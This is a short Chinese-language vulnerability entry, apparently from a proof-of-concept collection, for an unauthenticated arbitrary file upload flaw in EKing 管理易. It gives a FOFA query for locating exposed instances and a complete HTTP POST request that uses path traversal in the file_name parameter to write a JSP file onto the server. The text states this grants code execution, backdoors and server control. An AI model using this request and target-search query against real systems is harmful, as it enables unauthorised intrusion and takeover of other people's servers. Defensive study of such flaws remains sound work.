# eking管理易FileUpload接口存在任意文件上传漏洞

EKing-管理易 FileUpload.ihtm 接口处存在文件上传漏洞，未经身份验证的远程攻击者可利用此漏洞上传任意文件，在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa

```yaml
app="EKing-管理易"
```

## poc

```yaml
POST /app/FileUpload.ihtm?comm_type=EKING&file_name=../../rce.jsp. HTTP/1.1
Host: 
User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=WebKitFormBoundaryHHaZAYecVOf5sfa6

--WebKitFormBoundaryHHaZAYecVOf5sfa6
Content-Disposition: form-data; name="uplo_file"; filename="rce.jpg"

<% out.println("hello");%>
--WebKitFormBoundaryHHaZAYecVOf5sfa6--
```

![d6195b5041564ca4bb7b6ae0a4437513.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407301642889.png)

![25f79982d40949828bd29e1d81404123.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407301643141.png)